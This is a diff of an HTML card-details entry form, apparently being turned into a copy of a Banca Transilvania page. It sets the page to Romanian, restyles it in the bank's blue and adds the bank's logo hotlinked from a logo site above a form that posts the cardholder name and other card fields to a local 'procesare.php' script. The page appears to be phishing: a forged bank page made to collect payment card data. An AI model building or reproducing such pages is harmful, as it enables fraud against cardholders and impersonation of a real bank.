@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ro">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,7 +9,7 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f4;
+            background-color: #f5f5f5;
         }
         .container {
             max-width: 400px;
@@ -18,14 +18,17 @@
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border: 1px solid #ccc;
         }
         h1 {
             text-align: center;
+            color: #003366;
         }
         label {
             display: block;
             margin-bottom: 5px;
             font-weight: bold;
+            color: #003366;
         }
         input[type="text"] {
             width: 100%;
@@ -40,18 +43,29 @@
             padding: 10px;
             border: none;
             border-radius: 4px;
-            background-color: #4CAF50;
+            background-color: #003366;
             color: white;
             cursor: pointer;
             font-size: 16px;
         }
         input[type="submit"]:hover {
-            background-color: #45a049;
+            background-color: #002245;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 100%;
+            height: auto;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="logo">
+            <img src="https://seeklogo.com/images/B/banca-transilvania-logo-B28724217A-seeklogo.com.png" alt="Banca Transilvania">
+        </div>
         <h1>Introducere Date Card</h1>
         <form action="procesare.php" method="post">
             <label for="nume_card">Numele de pe card:</label>
